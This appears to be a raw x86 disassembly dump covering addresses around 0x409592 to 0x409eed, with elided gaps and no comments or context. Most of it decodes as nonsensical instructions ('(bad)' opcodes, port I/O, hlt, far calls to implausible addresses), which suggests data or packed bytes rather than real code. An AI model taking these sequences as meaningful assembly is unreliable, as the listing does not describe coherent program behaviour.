  409592:	test   DWORD PTR [eax+0x70],ebp
  409595:	mov    ecx,0xc5537274
  40959a:	jae    0x40960f
  40959c:	fs mov edx,0xd2006d71
  4095a2:	fs push 0x646ece70
  4095a8:	popa   
  4095a9:	shl    DWORD PTR [ebx+0x41],1
  4095ac:	imul   eax,ecx,0xd370608b
  4095b2:	outs   dx,BYTE PTR ds:[esi]
  4095b3:	outs   dx,BYTE PTR ds:[esi]
  4095b4:	ins    DWORD PTR es:[edi],dx
	...
  4095cd:	add    ch,dl
  4095cf:	ds dec eax
  4095d1:	push   esp
  4095d2:	sub    BYTE PTR [edx+0x4f],cl
  4095d5:	add    BYTE PTR [edx],dl
  4095d7:	gs push 0x72821170
  4095dd:	jo     0x4095b9
  4095df:	pop    ebx
  4095e0:	fs dec ecx
  4095e2:	call   0xdda5fc50
  4095e7:	or     BYTE PTR [eax],al
  4095e9:	add    BYTE PTR [edx],dl
  4095eb:	gs push 0x73661270
  4095f1:	dec    ecx
  4095f2:	enter  0x6669,0x65
  4095f6:	push   eax
  4095f7:	jle    0x40965b
  4095f9:	outs   dx,DWORD PTR ds:[esi]
  4095fa:	mov    cl,0x65
  4095fc:	jno    0x409671
  4095fe:	pop    esi
  4095ff:	cmp    DWORD PTR [ecx+0x65],0x89d
  409606:	push   edx
  409607:	test   BYTE PTR [eax+0x70],ch
  40960a:	push   edx
  40960b:	gs jae 0x409657
  40960e:	cmp    BYTE PTR [ecx+0x66],ch
  409611:	mov    al,gs:0x716f627e
  409617:	gs jno 0x40968d
  40961a:	hlt    
  40961b:	sub    eax,0x6af40003
  409620:	lahf   
  409621:	push   0x75a47ec4
  409626:	rcl    DWORD PTR [eax+ebx*4+0x60],1
  40962a:	fist   DWORD PTR [eax-0x66589131]
  409630:	mov    ah,0x64
	...
  40964a:	add    BYTE PTR [ebp-0xbfffc48],dl
  409650:	js     0x409672
  409652:	pop    ebx
  409653:	add    eax,ebp
  409655:	sub    eax,0x46b1b12d
  40965a:	pop    ebp
  40965b:	inc    edi
  40965c:	std    
  40965d:	(bad)  
  40965e:	out    0x1f,al
  409660:	add    eax,DWORD PTR cs:[eax]
  409663:	hlt    
  409664:	in     al,dx
  409665:	lds    eax,FWORD PTR [edx-0x50]
  409668:	call   0xd57cdd2e
  40966d:	mov    ebp,0xb9f1384a
  409672:	dec    esi
  409673:	inc    esp
  409674:	fst    st(5)
  409676:	push   edx
  409677:	inc    eax
  409678:	(bad)  
  40967a:	push   esi
  40967b:	sub    al,0xe5
  40967d:	int    0x60
  40967f:	push   esi
  409680:	push   fs
  409682:	fs pop edx
  409684:	adc    ebx,DWORD PTR [eax+ebp*2+0x6c98074e]
  40968b:	and    bh,BYTE PTR [ebx]
  40968d:	mov    bl,0x70
  40968f:	es aas 
  409691:	scas   eax,DWORD PTR es:[edi]
  409692:	je     0x4096be
  409694:	inc    ebx
  409695:	stos   DWORD PTR es:[edi],eax
  409696:	js     0x4096b6
  409698:	(bad)  
  409699:	repnz xor edi,eax
  40969c:	and    esi,ebp
  40969e:	xor    eax,0x2aeb05c3
  4096a3:	shr    DWORD PTR ds:0x2df40003,cl
  4096a9:	add    eax,DWORD PTR [eax]
  4096ab:	hlt    
  4096ac:	add    al,0xa5
  4096ae:	fild   WORD PTR [eax]
	...
  4096c8:	pop    ss
  4096c9:	jmp    0x99274c69
  4096ce:	fwait
  4096cf:	mov    cl,0xe2
  4096d1:	pushf  
  4096d2:	(bad)  
  4096d3:	lods   eax,DWORD PTR ds:[esi]
  4096d4:	into   
  4096d5:	call   0xe95876a6
  4096da:	(bad)  
  4096db:	fild   WORD PTR [ecx]
  4096dd:	in     al,0xa8
  4096df:	ret    0xc7b5
  4096e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096e3:	mov    esi,0xbb30cbb9
  4096e8:	mov    ebp,0xb1b72ccf
  4096ed:	sar    DWORD PTR [eax],cl
  4096ef:	rol    ebp,cl
  4096f1:	mov    bh,0x34
  4096f3:	iret   
  4096f4:	test   eax,0xd7e00cbb
  4096f9:	call   0xbdec7702
  4096fe:	adc    cl,ch
  409700:	lahf   
  409701:	ror    DWORD PTR [esi],0xc9
  409704:	push   ebx
  409705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409706:	or     ah,BYTE PTR [ebp-0x5ef957a9]
  40970c:	pop    ebx
  40970d:	lods   al,BYTE PTR ds:[esi]
  40970e:	add    bl,BYTE PTR [ebp-0x67014fb1]
  409714:	arpl   WORD PTR [eax+ebp*8-0x35fb0bfd],dx
  40971b:	cmp    al,0x34
  40971d:	add    eax,0x535a26a
  409722:	xor    BYTE PTR [esi*1+0x1103d205],cl
  409729:	add    eax,0x3db
	...
  409742:	add    BYTE PTR [eax],al
  409744:	add    BYTE PTR [edx],dl
  409746:	add    eax,0x50803cc
  40974b:	sbb    al,BYTE PTR [esi+eax*8]
  40974e:	add    al,0x17
  409750:	add    al,0x10
  409752:	add    eax,0x51003cd
  409757:	add    cl,ch
  409759:	test   DWORD PTR [eax+eax*1],0x459692a6
  409760:	nop
  409761:	sub    DWORD PTR [ecx-0x4c6a70b8],0x71
  409768:	test   BYTE PTR [esi+0x6d7e6896],dl
  40976e:	les    edi,FWORD PTR [eax-0x4f]
  409771:	xchg   esi,eax
  409772:	mov    al,0x63
  409774:	lea    esp,[edx-0x37]
  409777:	ja     0x409762
  409779:	test   DWORD PTR [eax+eax*1],0x4596929a
  409780:	push   eax
  409781:	mov    WORD PTR [ecx-0x4c7db0b8],gs
  409787:	jno    0x4097cd
  409789:	push   ecx
  40978a:	xchg   esi,eax
  40978b:	push   0x78c46a3e
  409790:	xor    DWORD PTR [ecx-0x50],edx
  409793:	arpl   WORD PTR [ebp+0x55],cx
  409796:	and    bh,bh
  409798:	outs   dx,DWORD PTR ds:[esi]
  409799:	cmp    eax,ebp
  40979b:	push   DWORD PTR [eax]
  40979d:	rol    esp,cl
  40979f:	jmp    FWORD PTR [esi-0x55]
  4097a2:	(bad)  
  4097a3:	(bad)  
  4097a4:	cmp    ch,al
  4097a6:	(bad)  
  4097a7:	inc    DWORD PTR [eax+eax*1]
	...
  4097c2:	jns    0x4097e5
  4097c4:	inc    DWORD PTR [ecx]
  4097c6:	loop   0x4097e9
  4097c8:	call   DWORD PTR [ecx]
  4097ca:	lds    esp,FWORD PTR [ecx]
  4097cc:	call   DWORD PTR [ecx]
  4097ce:	les    esp,FWORD PTR [ecx]
  4097d0:	inc    DWORD PTR [ecx]
  4097d2:	(bad)  
  4097d3:	and    edi,edi
  4097d5:	add    DWORD PTR [esi-0x5f2e00df],esp
  4097db:	and    edi,edi
  4097dd:	lds    eax,FWORD PTR [eax+0x7bdcff97]
  4097e3:	and    edi,edi
  4097e5:	aad    0x45
  4097e7:	and    edi,edi
  4097e9:	add    BYTE PTR [ebp-0x500000ad],ah
  4097ef:	push   ebx
  4097f0:	(bad)  
  4097f1:	dec    DWORD PTR [edi+0x5e020203]
  4097f7:	add    eax,DWORD PTR [edx]
  4097f9:	add    bl,BYTE PTR [edi+0x3]
  4097fc:	add    al,BYTE PTR [edx]
  4097fe:	sbb    ecx,DWORD PTR [bx+di]
  409801:	and    BYTE PTR [edi+0x1b],dl
  409804:	or     DWORD PTR [edx],ecx
  409806:	push   edi
  409807:	sbb    ecx,DWORD PTR [ecx]
  409809:	or     cl,dh
  40980b:	data16 jno 0x409877
  40980e:	mov    ebp,0x73ffff71
  409813:	arpl   WORD PTR [edx+0x70],si
  409816:	add    ax,0x0
  40981a:	fbld   TBYTE PTR [edi+0x72]
  40981d:	imul   ebp,DWORD PTR [esi-0x740000d8],0x4062
	...
  40983f:	pushf  
  409840:	popa   
  409841:	inc    eax
  409842:	add    BYTE PTR [ebp+0x2c],ah
  409845:	inc    ecx
  409846:	add    BYTE PTR [esi+0x2c],ch
  409849:	inc    ecx
  40984a:	add    BYTE PTR [esi+0x2c],ch
  40984d:	inc    ecx
  40984e:	add    BYTE PTR [esi+0x2d],bh
  409851:	inc    ecx
  409852:	add    BYTE PTR [ebp+0x2d],al
  409855:	inc    ecx
  409856:	add    BYTE PTR [ebp+0x1d004060],ch
  40985c:	inc    ebp
  40985d:	inc    eax
  40985e:	add    BYTE PTR [eax],ah
  409860:	inc    ebp
  409861:	inc    eax
  409862:	add    BYTE PTR [eax-0x46fffffc],ah
  409868:	inc    edi
  409869:	dec    edi
  40986a:	push   edx
  40986b:	adc    dl,BYTE PTR [ecx+0x58]
  40986e:	pop    edi
  40986f:	push   cs
  409870:	inc    esi
  409871:	push   ecx
  409872:	push   esi
  409873:	pop    eax
  409874:	ss pop esi
  409876:	dec    eax
  409877:	push   edx
  409878:	xor    edx,DWORD PTR [ebx+0x5f]
  40987b:	hlt    
  40987c:	adc    DWORD PTR [eax+eax*1],eax
  40987f:	hlt    
  409880:	inc    esp
  409881:	xchg   ebp,eax
  409882:	imul   edx,DWORD PTR [ecx],0x83ffaf4b
  409888:	push   esi
  409889:	iret   
  40988a:	push   ebx
  40988b:	and    al,0x7
  40988d:	cmc    
  40988e:	sub    eax,0x32e25
  409893:	hlt    
  409894:	pop    ebp
  409895:	mov    dh,0x52
  409897:	enter  0x32d,0x0
  40989b:	hlt    
  40989c:	outs   dx,BYTE PTR ds:[esi]
  40989d:	rcl    BYTE PTR [ebx-0xc],0x5b
  4098a1:	mov    ebp,0x41
	...
  4098ba:	add    BYTE PTR [eax],al
  4098bc:	adc    al,0x5e
  4098be:	repz xor dl,BYTE PTR [edx]
  4098c1:	pop    esi
  4098c2:	repz xor ch,dh
  4098c5:	sub    eax,0x7bf40003
  4098ca:	mov    ebp,0x32dd441
  4098cf:	add    ah,dh
  4098d1:	fld    QWORD PTR [ebx]
  4098d3:	jb     0x4098c9
  4098d5:	mov    BYTE PTR [ebx],0x68
  4098d8:	hlt    
  4098d9:	les    eax,FWORD PTR [ebx]
  4098db:	(bad)  
  4098dc:	hlt    
  4098dd:	mov    ah,0x3
  4098df:	je     0x4098d5
  4098e1:	jmp    0xf234ece9
  4098e6:	add    eax,DWORD PTR [eax]
  4098e8:	hlt    
  4098e9:	out    0x3,al
  4098eb:	ins    BYTE PTR es:[edi],dx
  4098ec:	hlt    
  4098ed:	test   BYTE PTR [ebx],0x62
  4098f0:	hlt    
  4098f1:	or     al,0x4
  4098f3:	ins    BYTE PTR es:[edi],dx
  4098f4:	hlt    
  4098f5:	fld    DWORD PTR [ebx]
  4098f7:	add    ah,dh
  4098f9:	add    DWORD PTR [edi+ebp*2],eax
  4098fc:	hlt    
  4098fd:	or     al,BYTE PTR [ecx+eiz*2]
  409900:	hlt    
  409901:	adc    DWORD PTR [esp+ebx*2],eax
  409904:	hlt    
  409905:	sub    eax,0xb1f40003
  40990a:	jne    0x40994d
  40990c:	hlt    
  40990d:	add    al,0xd8
  40990f:	xchg   ecx,eax
  409910:	xor    eax,0x45ceb905
  409915:	enter  0x3ab,0xf4
  409919:	add    al,0xb9
  40991b:	ret    0xc427
  40991e:	mov    al,0x3
	...
  409938:	add    ah,dh
  40993a:	add    al,0x94
  40993c:	mov    ch,0x26
  40993e:	mov    edx,0xb2b6d0aa
  409943:	lahf   
  409944:	shl    DWORD PTR [eax-0x4a3145fc],0xb3
  40994b:	test   eax,0xabc2acd1
  409950:	add    esi,esp
  409952:	add    al,0x9f
  409954:	mov    ah,0xa7
  409956:	int    0xae
  409958:	retf   0x1f43
  40995b:	lods   al,BYTE PTR ds:[esi]
  40995c:	(bad)  
  40995d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40995e:	leave  
  40995f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409960:	shl    DWORD PTR [esi-0xbfc1734],1
  409966:	add    al,0x34
  409968:	mov    edi,0x423c7c5
  40996d:	hlt    
  40996e:	add    al,0x2a
  409970:	mov    esp,0xb521c3b8
  409975:	mov    al,ds:0xf403e8b8
  40997a:	add    al,0x2c
  40997c:	mov    ecx,0xbb1cc3b4
  409981:	dec    ecx
  409982:	int3   
  409983:	adc    al,0xcb
  409985:	jmp    0x4099a5
  409987:	cmp    edi,DWORD PTR [edi-0x2fc531cd]
  40998d:	fistp  DWORD PTR [esi]
  40998f:	cmp    al,0xb6
  409991:	aas    
  409992:	into   
  409993:	sub    DWORD PTR [ecx-0x40e5e135],edi
  409999:	xor    al,0xb3
  40999b:	sub    DWORD PTR [eax+eax*1+0x0],edi
	...
  4099b6:	mov    ebx,0xc619001e
  4099bb:	iret   
  4099bc:	dec    edi
  4099bd:	sbb    DWORD PTR [edi-0x84ebd4e],esi
  4099c3:	add    al,0x0
  4099c5:	mov    ecx,0xaf4fcfc5
  4099ca:	dec    esi
  4099cb:	rol    BYTE PTR [ebx-0x17],1
  4099ce:	test   DWORD PTR [eax+eax*1],0x44b848b4
  4099d5:	jmp    0xa4409ed1
  4099da:	lods   al,BYTE PTR ds:[esi]
  4099db:	ret    
  4099dc:	dec    esi
  4099dd:	popf   
  4099de:	test   DWORD PTR [eax+eax*1],0x4ac3a8b5
  4099e5:	jmp    0xaa409ee1
  4099ea:	mov    dh,cl
  4099ec:	pop    eax
  4099ed:	jmp    0x9d409ee9
  4099f2:	and    eax,0xf7a442c5
  4099f7:	add    al,0x0
  4099f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099fa:	inc    edi
  4099fb:	mov    dl,0x48
  4099fd:	sahf   
  4099fe:	popa   
  4099ff:	mov    bl,0xff
  409a01:	sub    DWORD PTR [edi-0x30],eax
  409a04:	dec    ebp
  409a05:	and    al,0x33
  409a07:	mov    dl,0xff
  409a09:	cmp    BYTE PTR [ebp-0x4e],cl
  409a0c:	jmp    DWORD PTR [eax]
  409a0e:	cmp    eax,0xf7e943c5
  409a13:	add    al,0x0
  409a15:	and    eax,0x1d44ca2d
	...
  409a32:	add    BYTE PTR [ebp-0x58b500e3],bh
  409a38:	scas   eax,DWORD PTR es:[edi]
  409a39:	ins    DWORD PTR es:[edi],dx
  409a3a:	or     al,0x9b
  409a3c:	xchg   ecx,eax
  409a3d:	push   0xff1da60e
  409a42:	sbb    DWORD PTR [edx-0x52],ebp
  409a45:	ja     0x409a57
  409a47:	lds    esp,FWORD PTR [edx+0x52eb006e]
  409a4d:	fs arpl cx,ax
  409a50:	jo     0x409ac0
  409a52:	outs   dx,BYTE PTR ds:[esi]
  409a53:	popf   
  409a54:	add    DWORD PTR [eax],eax
  409a56:	add    dh,bh
  409a58:	push   ecx
  409a59:	ins    DWORD PTR es:[edi],dx
  409a5a:	je     0x409a0c
  409a5c:	push   ebx
  409a5d:	jae    0x409a8c
  409a5f:	test   eax,0xb1676d6c
  409a64:	imul   edi,edi,0x6077a1ff
  409a6a:	outs   dx,BYTE PTR ds:[esi]
  409a6b:	imul   esp,DWORD PTR ds:[edx+esi*2-0x18],0x6b
  409a71:	ins    DWORD PTR es:[edi],dx
  409a72:	arpl   WORD PTR [edx],di
  409a74:	gs push 0x1326e
  409a7a:	add    BYTE PTR [eax+0x6c726671],al
  409a80:	gs add BYTE PTR fs:[esi+0x69],bh
  409a85:	je     0x409af5
  409a87:	jbe    0x409af5
  409a89:	arpl   WORD PTR [eax],ax
  409a8b:	data16 ins BYTE PTR es:[edi],dx
  409a8d:	fs jo  0x409ab8
  409a90:	push   0x6cb3696b
  409a95:	(bad)  
  409a96:	inc    DWORD PTR [eax]
	...
  409ab0:	jle    0x409b1f
  409ab2:	outs   dx,BYTE PTR ds:[esi]
  409ab3:	jae    0x409a65
  409ab5:	or     BYTE PTR [eax],al
  409ab7:	add    BYTE PTR [ebp+0x3e],al
  409aba:	inc    ecx
  409abb:	add    BYTE PTR [esi-0x51],dl
  409abe:	inc    eax
  409abf:	add    BYTE PTR [ebx],ch
  409ac1:	scas   al,BYTE PTR es:[edi]
  409ac2:	inc    eax
  409ac3:	add    dh,bl
  409ac5:	or     BYTE PTR [edx],bh
  409ac7:	add    ch,ah
  409ac9:	or     BYTE PTR [ebp+0x0],cl
  409acc:	sbb    DWORD PTR [ecx],eax
  409ace:	cmp    eax,DWORD PTR [eax]
  409ad0:	out    0x8,al
  409ad2:	dec    esi
  409ad3:	add    BYTE PTR [edi],bl
  409ad5:	add    DWORD PTR [esi+0x0],ecx
  409ad8:	and    al,BYTE PTR [ecx]
  409ada:	dec    esi
  409adb:	add    ah,dh
  409add:	aad    0x3
  409adf:	cmp    esi,esp
  409ae1:	add    edi,DWORD PTR ss:[ebx]
  409ae4:	hlt    
  409ae5:	rol    DWORD PTR [ebx],1
  409ae7:	push   edi
  409ae8:	hlt    
  409ae9:	xor    al,0x3
  409aeb:	add    ah,dh
  409aed:	push   ds
  409aee:	add    ebp,DWORD PTR [eax-0xc]
  409af1:	add    BYTE PTR [esp+ebp*2],al
  409af4:	hlt    
  409af5:	xor    DWORD PTR [ebx],eax
  409af7:	xor    esi,esp
  409af9:	inc    DWORD PTR [ebx]
  409afb:	cs hlt 
  409afd:	dec    ecx
  409afe:	add    ebp,DWORD PTR [esp+esi*8+0x59]
  409b02:	add    eax,DWORD PTR [eax]
  409b04:	hlt    
  409b05:	jle    0x409ad2
  409b07:	inc    esi
  409b08:	adc    DWORD PTR [edx-0x32],edx
  409b0b:	ins    DWORD PTR es:[edi],dx
  409b0c:	jecxz  0x409b68
  409b0e:	mov    cl,0x45
  409b10:	fistp  DWORD PTR [ecx-0x59]
  409b13:	add    BYTE PTR fs:[eax],al
	...
  409b2a:	add    BYTE PTR [eax],al
  409b2c:	add    dh,ah
  409b2e:	pop    ebp
  409b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b30:	jae    0x409afe
  409b32:	sub    eax,0x96f40003
  409b37:	mov    ecx,0x45c8f441
  409b3c:	inc    ecx
  409b3d:	hlt    
  409b3e:	rol    BYTE PTR [ebp+0x41],0xf4
  409b42:	out    dx,eax
  409b43:	inc    ebp
  409b44:	inc    ecx
  409b45:	hlt    
  409b46:	mov    dh,0xb9
  409b48:	inc    ecx
  409b49:	hlt    
  409b4a:	call   0x5334dc94
  409b4f:	dec    esi
  409b50:	inc    ecx
  409b51:	hlt    
  409b52:	ins    DWORD PTR es:[edi],dx
  409b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b54:	inc    ecx
  409b55:	hlt    
  409b56:	adc    BYTE PTR [eax+0x41],al
  409b59:	hlt    
  409b5a:	fisub  DWORD PTR [esi]
  409b5c:	inc    ecx
  409b5d:	hlt    
  409b5e:	fsub   DWORD PTR [esi]
  409b60:	inc    ecx
  409b61:	hlt    
  409b62:	retf   
  409b63:	add    esi,DWORD PTR [ebx-0xc]
  409b66:	fld    QWORD PTR [ebx]
  409b68:	jb     0x409b5e
  409b6a:	adc    DWORD PTR [ebx],eax
  409b6c:	cs hlt 
  409b6e:	add    al,0xd
  409b70:	add    al,0x48
  409b72:	add    eax,0x4f4040d
  409b77:	in     al,0xd
  409b79:	stc    
  409b7a:	push   cs
  409b7b:	jmp    0xb9458f83
  409b80:	push   cs
  409b81:	out    dx,al
  409b82:	or     ebx,esi
  409b84:	add    esi,esp
  409b86:	add    al,0xcc
  409b88:	fwait
  409b89:	stos   DWORD PTR es:[edi],eax
  409b8a:	sbb    ebx,esp
  409b8c:	or     eax,0xe42304f4
	...
  409ba9:	add    BYTE PTR [ebx-0xbfbece5],bl
  409baf:	add    al,0xde
  409bb1:	mov    al,0x4
  409bb3:	add    eax,0xd5cbed19
  409bb8:	(bad)  
  409bb9:	xchg   esi,eax
  409bba:	mov    edi,0xf40402d1
  409bbf:	add    al,0x78
  409bc1:	jbe    0x409c37
  409bc3:	push   ebp
  409bc4:	push   esi
  409bc5:	ja     0x409b4c
  409bc7:	cmp    BYTE PTR [ebx-0x73],0x8d
  409bcb:	mov    bh,BYTE PTR [esi-0x75]
  409bce:	pushf  
  409bcf:	(bad)  
  409bd0:	pusha  
  409bd1:	cmp    DWORD PTR [ecx-0x73],0x66
  409bd5:	imul   ebp,DWORD PTR [ebp+0x77],0x865c9072
  409bdc:	popa   
  409bdd:	jbe    0x409c52
  409bdf:	add    al,0x93
  409be1:	mov    esi,0xc79ebab3
  409be6:	ret    0x2a02
  409be9:	into   
  409bea:	lods   al,BYTE PTR ds:[esi]
  409beb:	add    al,0xbc
  409bed:	inc    eax
  409bee:	das    
  409bef:	cmp    al,0xd2
  409bf1:	sub    eax,0x13b6100a
  409bf6:	sbb    DWORD PTR [edi],edx
  409bf8:	fwait
  409bf9:	sub    ecx,DWORD PTR [ebx]
  409bfb:	and    al,0xb5
  409bfd:	add    esi,esp
  409bff:	add    al,0x0
  409c01:	mov    esp,0x95e7160c
  409c06:	cmp    DWORD PTR [eax+ebp*8-0x4a],eax
  409c0a:	sub    eax,0xb6db42
	...
  409c27:	test   DWORD PTR [eax+eax*1],0xd4463cac
  409c2e:	xchg   ecx,eax
  409c2f:	sbb    DWORD PTR [eax+esi*8],ebx
  409c32:	xchg   ecx,eax
  409c33:	fldcw  WORD PTR [eax]
  409c35:	cld    
  409c36:	lods   al,BYTE PTR ds:[esi]
  409c37:	adc    DWORD PTR [edx],ebp
  409c39:	out    dx,al
  409c3a:	sbb    bl,0x2a
  409c3d:	repnz cwde 
  409c3f:	test   DWORD PTR [eax+eax*1],0x30e48e0d
  409c46:	push   es
  409c47:	xchg   ebp,eax
  409c48:	mov    al,ds:0xd195dc65
  409c4d:	xor    ebp,ecx
  409c4f:	test   DWORD PTR [eax+eax*1],0x1f5790f
  409c56:	out    0x66,eax
  409c58:	add    eax,0xb4b0817
  409c5d:	push   cs
  409c5e:	in     al,dx
  409c5f:	pop    esi
  409c60:	or     ebx,DWORD PTR [ebx]
  409c62:	shr    al,1
  409c64:	hlt    
  409c65:	cmp    ebx,ebx
  409c67:	in     al,0xff
  409c69:	adc    eax,0xaf7faf3
  409c6e:	aam    0x5a
  409c70:	add    al,0x9
  409c72:	into   
  409c73:	sbb    dh,ah
  409c75:	cmp    BYTE PTR [esi+0x7eff1a1b],dh
  409c7b:	cmp    edx,ebx
  409c7d:	push   edx
  409c7e:	xchg   esi,eax
  409c7f:	aaa    
  409c80:	retf   0x5945
  409c83:	push   eax
  409c84:	ret    
  409c85:	dec    ebx
  409c86:	inc    ebx
  409c87:	cmp    bh,BYTE PTR [ebp+0x3b43]
	...
  409ca1:	add    BYTE PTR [eax],al
  409ca3:	add    BYTE PTR [ecx],dh
  409ca5:	sbb    bh,bh
  409ca7:	rcr    cl,cl
  409ca9:	and    ebx,esp
  409cab:	add    BYTE PTR [eax],ch
  409cad:	in     eax,0xe5
  409caf:	add    BYTE PTR [ecx+edi*4-0x58],dh
  409cb3:	mov    ebp,0xaabc8c6a
  409cb8:	js     0x409c71
  409cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cbb:	add    BYTE PTR [edx-0x54dba18b],ch
  409cc1:	cmp    bl,BYTE PTR [ebx+0x20]
  409cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cc5:	ss dec edi
  409cc7:	add    BYTE PTR [esi+0x3aede1e9],cl
  409ccd:	out    0xec,al
  409ccf:	shl    BYTE PTR [eax],1
  409cd1:	loopne 0x409cbb
  409cd3:	stc    
  409cd4:	jne    0x409cd0
  409cd6:	mov    edi,0x58dec
  409cdb:	add    BYTE PTR [edi-0x5c],dh
  409cde:	mov    eax,ds:0xb8be6ba4
  409ce3:	nop
  409ce4:	stos   BYTE PTR es:[di],al
  409ce6:	mov    ebx,0xd9d0e000
  409ceb:	leave  
  409cec:	rcr    dh,0xc9
  409cef:	fsub   QWORD PTR [edi]
  409cf1:	(bad)  
  409cf3:	idiv   BYTE PTR [ebp-0x4a011d1c]
  409cf9:	std    
  409cfa:	iret   
  409cfb:	(bad)  
  409cfd:	jmp    0x409cea
  409cff:	out    0xec,al
  409d01:	cld    
  409d02:	mov    ds:0xc2da0bcb,eax
  409d07:	hlt    
	...
  409d20:	add    cl,ah
  409d22:	mov    bl,0xd8
  409d24:	rol    DWORD PTR [ebx],cl
  409d26:	aam    0xdc
  409d28:	retf   
  409d29:	fcomp  st(2)
  409d2b:	fcmovu st,st(3)
  409d2d:	sbb    eax,0xbf000005
  409d32:	mov    al,BYTE PTR [ebp-0x6b7a8e68]
  409d38:	or     BYTE PTR [esi+ebx*4-0x7c],0x99
  409d3d:	hlt    
  409d3e:	sub    eax,DWORD PTR [ebx]
  409d40:	add    ah,dh
  409d42:	xchg   esp,eax
  409d43:	mov    WORD PTR [ecx-0x627a5191],ds
  409d49:	mov    dh,0xa0
  409d4b:	js     0x409cd1
  409d4d:	hlt    
  409d4e:	aam    0xae
  409d50:	jge    0x409dba
  409d52:	fst    QWORD PTR [ecx+esi*1-0x6a0ba4]
  409d59:	rol    DWORD PTR [eax-0x72370fde],cl
  409d5f:	adc    esi,ebp
  409d61:	jl     0x409ced
  409d63:	and    edi,esi
  409d65:	hlt    
  409d66:	xchg   DWORD PTR [ecx],edx
  409d68:	jecxz  0x409d18
  409d6a:	fwait
  409d6b:	sbb    esi,ebx
  409d6d:	outs   dx,DWORD PTR ds:[esi]
  409d6e:	(bad)  
  409d6f:	and    ebp,edi
  409d71:	hlt    
  409d72:	stos   BYTE PTR es:[edi],al
  409d73:	jne    0x409cfb
  409d75:	jnp    0x409cfa
  409d77:	add    BYTE PTR [edx-0x7a862288],0x6d
  409d7e:	add    eax,DWORD PTR cs:[eax]
  409d81:	hlt    
  409d82:	fbstp  TBYTE PTR [esi]
  409d84:	int    0x0
	...
  409d9e:	imul   ebp,ebx,0x3d
  409da1:	shl    esp,0xd5
  409da4:	pop    ss
  409da5:	call   FWORD PTR [eax-0x3a]
  409da8:	sbb    eax,0x3df75def
  409dad:	clc    
  409dae:	or     DWORD PTR [si],ebx
  409db1:	out    0x4f,al
  409db3:	or     DWORD PTR ds:0x23082bd5,ebx
  409db9:	jmp    0xdd549015
  409dbe:	aaa    
  409dbf:	sbb    al,0x16
  409dc1:	not    DWORD PTR ds:0x49cf4cf1
  409dc7:	loope  0x409e18
  409dc9:	aam    0x47
  409dcb:	or     DWORD PTR ds:0xc00531e3,ebp
  409dd1:	add    al,0xf4
  409dd3:	add    al,0x46
  409dd5:	mov    ds:0xd402e5de,al
  409dda:	scas   al,BYTE PTR es:[edi]
  409ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ddc:	inc    ecx
  409ddd:	loopne 0x409dad
  409ddf:	sar    edi,1
  409de1:	ret    
  409de2:	pop    esp
  409de3:	test   eax,0xdf1ef00b
  409de8:	setb   BYTE PTR [eax-0x29]
  409dec:	repnz aam 0x42
  409def:	cdq    
  409df0:	and    eax,0xbe612ec
  409df5:	(bad)  
  409df6:	xor    al,0xf7
  409df8:	out    dx,eax
  409df9:	dec    DWORD PTR [esi-0x3b]
  409dfc:	and    esp,esi
  409dfe:	(bad)  
  409e00:	pop    es
  409e01:	retf   0x0
	...
  409e18:	add    BYTE PTR [eax],al
  409e1a:	add    BYTE PTR [eax+0x0],al
  409e1d:	fpatan 
  409e1f:	sub    dh,BYTE PTR [ecx-0x6fcf3e3]
  409e25:	repz add esi,esp
  409e28:	add    al,0x19
  409e2a:	(bad)  
  409e2c:	in     al,dx
  409e2d:	fcmovu st,st(4)
  409e2f:	(bad)  
  409e30:	ror    DWORD PTR [ebx],1
  409e32:	aad    0x83
  409e34:	pop    ss
  409e35:	xor    DWORD PTR [esi],esi
  409e37:	mov    ds:0xf404234b,al
  409e3c:	add    al,0xe9
  409e3e:	add    esi,esp
  409e40:	add    al,0xe6
  409e42:	repnz icebp 
  409e44:	or     al,0xb2
  409e46:	xchg   esi,eax
  409e47:	or     ebx,ebp
  409e49:	out    0xe1,al
  409e4b:	and    edx,DWORD PTR [ecx+0x4f10601]
  409e51:	mov    DWORD PTR [esi+edx*8-0xb3c5967],ebx
  409e58:	fistp  QWORD PTR [ecx+edx*8-0x1b3a5f4e]
  409e5f:	shl    ch,cl
  409e61:	jmp    edx
  409e63:	and    eax,0x3c78710c
  409e68:	std    
  409e69:	sbb    bh,bl
  409e6b:	stc    
  409e6c:	add    eax,0xf2f41759
  409e71:	push   ds
  409e72:	loop   0x409e6c
  409e74:	add    ecx,DWORD PTR [ebx]
  409e76:	cmp    BYTE PTR [ecx-0x5e],dl
  409e79:	sub    dh,cl
  409e7b:	dec    DWORD PTR [ecx]
  409e7d:	add    ecx,ebp
	...
  409e97:	add    cl,ah
  409e99:	dec    BYTE PTR [esi]
  409e9b:	cmp    ah,cl
  409e9d:	fnstcw WORD PTR [eax]
  409e9f:	inc    ecx
  409ea0:	loope  0x409e95
  409ea2:	pop    edx
  409ea3:	and    DWORD PTR [eax-0x5b],esi
  409ea6:	jo     0x409ec4
  409ea8:	xchg   edx,eax
  409ea9:	ficomp DWORD PTR [ebx+0x3]
  409eac:	cwde   
  409ead:	lods   al,BYTE PTR ds:[esi]
  409eae:	ja     0x409eba
  409eb0:	mov    al,ds:0xfcfb2ced
  409eb5:	add    eax,0xc1bccf5c
  409eba:	cmp    esi,edx
  409ebc:	pushf  
  409ebd:	mov    esi,0xd3c0b830
  409ec2:	call   FWORD PTR [eax-0x28]
  409ec5:	daa    
  409ec6:	in     eax,0x45
  409ec8:	in     eax,0x7f
  409eca:	mov    fs,WORD PTR [edx-0x2d]
  409ecd:	sbb    edi,esp
  409ecf:	dec    ebx
  409ed0:	imul   ebp,DWORD PTR [ecx],0x232c2ec2
  409ed6:	shr    BYTE PTR [edi],0xb6
  409ed9:	xor    dh,al
  409edb:	pop    ss
  409edc:	or     eax,0xac12d74a
  409ee1:	ss enter 0xf7e9,0x4
  409ee6:	add    BYTE PTR [ecx-0x6a836e98],dl
  409eec:	(bad)  
  409eed:	stc    
